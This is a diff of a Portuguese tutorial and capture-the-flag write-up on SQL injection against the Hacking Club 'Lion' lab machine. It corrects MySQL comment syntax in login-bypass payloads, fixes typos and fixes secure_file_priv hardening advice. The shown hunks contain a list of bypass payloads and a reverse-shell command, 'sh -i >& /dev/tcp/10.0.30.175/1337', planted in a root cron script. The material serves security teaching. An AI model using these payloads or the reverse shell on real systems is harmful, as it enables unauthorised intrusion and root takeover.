@@ -4,8 +4,8 @@ description: "Guia completo e didático de SQL Injection com teoria, técnicas, 
 author: matheus
 date: 2025-12-06 12:00:00 -0300
 last_modified_at: 2026-01-02 20:00:00 -0300
-tags: ["SQL Injection", "web security", "pentesting", "RCE", "writeup", "Privilege Escalation", "HackingClub", "Manual Exploitation", "Deep Dive"]
-categories: ["SecLab", "WayOfSec", "Hacking", "Write Ups"]
+tags: ["SQL Injection", "MySQL", "pentesting", "RCE", "WriteUps", "privilege escalation", "HackingClub", "SQLMap"]
+categories: ["Segurança", "Web Security"]
 pin: false
 comments: true
 math: true
@@ -14,7 +14,7 @@ image:
   alt: "SQL Injection — exploração prática na máquina Lion do Hacking Club"
 ---
 
-# A "velha guarda" que ainda tem força para afetar "vibe sistemas" 
+## A "velha guarda" que ainda tem força para afetar "vibe sistemas"
 
 O SQL Injection (SQLi) é uma falha jurássica, mas que insiste em não ser extinta. Pelo contrário, ela ameaça voltar com força total em micro-sistemas modernos. O motivo é frustrante, mas real: temos uma geração inteira de "pseudo-desenvolvedores" e "vibe coders" que aprenderam a usar frameworks complexos e/ou agentes de IA para programar, mas não fazem a menor ideia de como a aplicação conversa com o banco de dados nos bastidores. Eles constroem castelos digitais em cima de areia, ignorando os fundamentos básicos de como uma *query* é estruturada, criando brechas críticas por pura ignorância.
 
@@ -184,30 +184,34 @@ Agora, vamos aplicar essa mesma lógica num formulário de login. Se você enten
 SELECT * FROM usuarios WHERE username = '$user' AND password = '$password';
 ```
 
-Se você digitar no campo de usuário: `admin' --`
+Se você digitar no campo de usuário: `admin'#`
+
+> Atenção ao comentário: no MySQL, o `--` só funciona como comentário se houver um **espaço** depois dele (ex.: `admin' -- -`). Sem o espaço, ele não comenta nada. Por isso, no MySQL, o mais seguro é usar `#` (ex.: `admin'#`) ou `-- ` com espaço.
 
 A query final se transforma nesta aberração:
 
 ```sql
-SELECT * FROM usuarios WHERE username = 'admin' --' AND password = '...';
+SELECT * FROM usuarios WHERE username = 'admin'# AND password = '...';
 ```
 
-O traço duplo (`--`) diz ao banco: "Ignore tudo o que vem depois daqui". Consequentemente, a parte `AND password = ...` é simplesmente apagada da lógica. O banco lê apenas "Selecione o usuário admin". O sistema loga você como administrador sem nunca verificar a senha. É um xeque-mate lógico.
+O `#` (ou o `-- ` com espaço) diz ao banco: "Ignore tudo o que vem depois daqui". Consequentemente, a parte `AND password = ...` é simplesmente apagada da lógica. O banco lê apenas "Selecione o usuário admin". O sistema loga você como administrador sem nunca verificar a senha. É um xeque-mate lógico.
 
 **Outras variações clássicas de bypass de login:**
 
 ```sql
 ' OR '1'='1
-' OR '1'='1' --
+' OR '1'='1' -- -
 ' OR '1'='1' /*
-admin'--
-admin' #
+admin'#
+admin' -- -
 admin'/*
-' OR 1=1--
 ' OR 1=1#
+' OR 1=1-- -
 ') OR ('1'='1
-') OR ('1'='1'--
+') OR ('1'='1'-- -
 ```
+
+> Lembre-se: no MySQL, use `#` ou `-- ` (com espaço, por isso o `-- -`). O `--` colado, sem espaço, não comenta nada no MySQL. Em outros bancos (PostgreSQL, MSSQL, Oracle), o `--` sozinho já funciona.
 
 A ideia é sempre a mesma: fechar a string, inserir uma condição verdadeira ou comentar o resto. A variação depende de como o código foi escrito e qual banco está por trás.
 
@@ -258,7 +262,9 @@ Se demorar 5 segundos, a primeira letra é 'a'. Se responder rápido, não é. �
 
 ### Out-of-Band SQLi (O Mais Raro)
 
-Quando não conseguimos ver resultados na página e nem medir tempo, mas conseguimos fazer o servidor enviar dados pra outro lugar (tipo um servidor nosso). Isso depende de funcionalidades específicas habilitadas no banco, como o `xp_dirtree` no MSSQL ou `LOAD_FILE` no MySQL. É menos comum, mas quando funciona, é poderoso.
+Quando não conseguimos ver resultados na página e nem medir tempo, mas conseguimos fazer o servidor enviar dados pra outro lugar (tipo um servidor nosso). Isso depende de funcionalidades específicas habilitadas no banco, como o `xp_dirtree` no MSSQL.
+
+> Cuidado com um mal-entendido comum: o `LOAD_FILE` do MySQL, por si só, **lê arquivos locais** do servidor (é um vetor *in-band*, não OOB). Para conseguir OOB de verdade no MySQL, você precisa forçar o banco a acessar um caminho **UNC/SMB** apontando para o seu servidor (ex.: `LOAD_FILE('\\\\atacante\\share')`), o que tipicamente só funciona no **Windows**. Em Linux, o MySQL praticamente não tem OOB nativo. É menos comum, mas quando funciona, é poderoso.
 
 ---
 
@@ -682,7 +688,7 @@ Mas vamos além, precisamos confirmar o SQL Injection para explorá-lo.
 
 A melhor e mais prática forma de testar, nesse caso, seria abusarmos da lógica matemática para uma condicional simples e irrefutável.
 
-Uma lógica matemática que sempre será verdadeira, como 1=1, pode ser utilizado para alterarmos a query e termos o resultado que queremos. Para isso precisaríamos começar com aspas para fechar o `'%` e não podemos esquecer de comentar o resto da query, se não ficará invalido novamente e veremos a tela de 'not found' com a primeira flag.
+Uma lógica matemática que sempre será verdadeira, como 1=1, pode ser utilizado para alterarmos a query e termos o resultado que queremos. Para isso precisaríamos começar com aspas para fechar o `'%` e não podemos esquecer de comentar o resto da query, senão ficará inválido novamente e veremos a tela de 'not found' com a primeira flag.
 
 Então, se digitarmos `' OR 1=1#`, a query ficaria mais ou menos assim:
 
@@ -804,7 +810,7 @@ O resultado aparece na tela: `admin::$2y$10$Hfz...` (uma hash longa começando c
 
 Aqui encontramos nosso primeiro muro de concreto. A hash da senha está criptografada com **Bcrypt** (identificamos pelo prefixo `$2y$`). 
 
-O Bcrypt oferece uma segurança muito maior que outros algoritmos criptográficos porque contém uma variável que é proporcional à quantidade de processamento necessário para criptografar a informação desejada. Isso significa que ele é projetado para ser matematicamente **lento** - resistente a ataques de força bruta.
+O Bcrypt oferece uma segurança muito maior que outros algoritmos criptográficos porque contém uma variável (o *cost factor*) que controla o custo de processamento de forma **exponencial**: cada incremento no *cost* **dobra** o número de iterações (são `2^cost` rodadas). Isso significa que ele é projetado para ser matematicamente **lento** - resistente a ataques de força bruta.
 
 Cada tentativa de quebra demora milissegundos a mais, o que não parece muito, mas quando você precisa testar milhões de senhas, isso vira dias ou semanas de processamento. Não vale a pena tentar quebrar.
 
@@ -1072,11 +1078,11 @@ Binários com bit SUID executam com as permissões do **dono** do arquivo, não 
 
 O `find /` indica que o comando find vai buscar a partir do diretório raiz, percorrendo todo o sistema de arquivos.
 
-O `-perm -4000` filtra os resultados para incluir APENAS arquivos com o bit SUID habilitado. O valor 4000 é permissão SUID, quando esse bit está ativo o programa roda com o UID efetivo do dono do arquivo (root, por exemplo), indepentemente de quem o executa.
+O `-perm -4000` filtra os resultados para incluir APENAS arquivos com o bit SUID habilitado. O valor 4000 é permissão SUID, quando esse bit está ativo o programa roda com o UID efetivo do dono do arquivo (root, por exemplo), independentemente de quem o executa.
 
 Já o `-type f` restringe para buscar arquivos (files) regulares, e não diretórios ou links.
 
-O redirecionamento com `2>/dev/null` é basicamente para **não printar os erros**. `2` é o descritor de arquivo do `stder` (saída de erro padrão), e o operador `>` é o de redirecionamento, que nesse caso vai para `/dev/null/`, que é um dispositivo especial que descarta tudo o que recebe.
+O redirecionamento com `2>/dev/null` é basicamente para **não printar os erros**. `2` é o descritor de arquivo do `stderr` (saída de erro padrão), e o operador `>` é o de redirecionamento, que nesse caso vai para `/dev/null`, que é um dispositivo especial que descarta tudo o que recebe.
 
 Aqui já temos um resultado lindo e podemos progredir.
 
@@ -1229,7 +1235,7 @@ bash-4.2$ ls -la /opt/lion/lion.backup.sh
 
  >/opt/lion/lion.backup.sh é um cron com permissão 777
 
-Teremos nosso nossa nova shell reversa pelo script executar sempre como root, enquanto pode ser editado por um usuário comum:
+Teremos nossa nova shell reversa pelo script executar sempre como root, enquanto pode ser editado por um usuário comum:
 
 **Analisando as permissões:**
 - Primeiro caractere: `-` = arquivo regular
@@ -1335,7 +1341,7 @@ echo '#!/bin/bash \
 /bin/bash -c "sh -i >& /dev/tcp/10.0.30.175/1337 0>&1"' > /opt/lion/lion.backup.sh
 ```
 
-Ou se quiser manter o conteúdo original e só adicionar nossa linha, use o operador dua vezes `>>`:
+Ou se quiser manter o conteúdo original e só adicionar nossa linha, use o operador duas vezes `>>`:
 
 ```bash
 echo '/bin/bash -c "sh -i >& /dev/tcp/10.0.30.175/1337 0>&1"' >> /opt/lion/lion.backup.sh
@@ -1483,10 +1489,13 @@ GRANT SELECT, INSERT, UPDATE ON meu_banco.* TO 'app_user'@'localhost';
 ```
 
 **3. Desabilitar Funções Perigosas**
-No MySQL, a variável `secure_file_priv` limita onde `INTO OUTFILE` pode escrever. Configure para um diretório específico ou deixe vazio para desabilitar:
+No MySQL, a variável `secure_file_priv` controla onde `INTO OUTFILE`/`LOAD_FILE` podem operar. Atenção, pois o comportamento é o oposto do que muita gente imagina: deixar vazio (`""`) **LIBERA** a escrita/leitura em qualquer diretório (inseguro!). Para **desabilitar** completamente essas funções, use `NULL` (sem aspas). Para apenas restringir, aponte para um diretório específico:
 ```ini
 # my.cnf
-secure_file_priv = ""
+# Desabilita totalmente INTO OUTFILE/LOAD_FILE:
+secure_file_priv = NULL
+# (ou restrinja a um diretório específico, ex.: secure_file_priv = /var/lib/mysql-files/)
+# NUNCA deixe vazio (secure_file_priv = "") -> libera qualquer diretório!
 ```
 
 **4. WAF (Web Application Firewall)**
@@ -1521,11 +1530,11 @@ Quer saber se sua aplicação é vulnerável? Teste você mesmo (em ambiente de 
 
 Percorremos um longo caminho. Começamos entendendo a teoria da "planilha do Excel" e o perigo da concatenação de strings. Passamos pelos diferentes tipos de SQLi (In-Band, Blind, Out-of-Band), aprendemos a mecânica do UNION e do INTO OUTFILE, e praticamos em laboratórios. Enfrentamos a frustração de uma senha Bcrypt inquebrável na Lion, o que nos forçou a pivotar criativamente para uma webshell. E, finalmente, usamos conhecimento base de Linux para identificar manualmente uma permissão de arquivo errada e virar administradores.
 
-A lição que fica é clara: **ferramentas te ajudam, mas é o fundamento teórico que te salva** quando você precisa tomar decisões criativas. No que diz respeito a "desenvolvimento vibe-coding", se você tem o fundamento consegue pensar em prompts que forçam a IA a evitar determinadas ações que culminariam erros como SQLi, por exemplo. No que diz respeito ao processo de exploração, saber tomar decisões como abandonar o hash cracking ou procurar vetores manuais quando os scripts falham é o que separa o script kiddie do pentester de verdade.
+A lição que fica é clara: **ferramentas te ajudam, mas é o fundamento teórico que te salva** quando você precisa tomar decisões criativas. No que diz respeito a "desenvolvimento vibe-coding", se você tem o fundamento consegue pensar em prompts que forçam a IA a evitar determinadas ações que culminariam em erros como SQLi, por exemplo. No que diz respeito ao processo de exploração, saber tomar decisões como abandonar o hash cracking ou procurar vetores manuais quando os scripts falham é o que separa o script kiddie do pentester de verdade.
 
 SQL Injection existe desde os anos 90 e, infelizmente, continua relevante porque os mesmos erros continuam sendo cometidos, as vezes apenas de uma forma menos clara e tosca. A real diferença mesmo é que agora temos mais camadas de abstração (frameworks, ORMs, bibliotecas) que podem ajudar ou também podem dar falsa sensação de segurança. No fim das contas, entender o que acontece por baixo dos panos é o que faz a diferença e se você está lendo isso aqui, parabéns!
 
-Enquanto houver desenvolvedores que ignoram a base, sempre haverá uma shell esperando por nós. Pratiquem, estudem a teoria e até a próxima invasão! A próxima máquina que resolveremos será outra com SQLi chamada GAP, também do hackingclub. Ela é um pouco mais difícil que a Lion e deixarei para outra publicação separada, mas é um excelente complemento... quase todos os requisitos para fazer a Lion também serve para ela, mas algumas coisas são diferentes, principalmente na elevação de pribilégio. Te vejo lá!
+Enquanto houver desenvolvedores que ignoram a base, sempre haverá uma shell esperando por nós. Pratiquem, estudem a teoria e até a próxima invasão! A próxima máquina que resolveremos será outra com SQLi chamada GAP, também do hackingclub. Ela é um pouco mais difícil que a Lion e deixarei para outra publicação separada, mas é um excelente complemento... quase todos os requisitos para fazer a Lion também serve para ela, mas algumas coisas são diferentes, principalmente na elevação de privilégio. Te vejo lá!
 
 ---
 
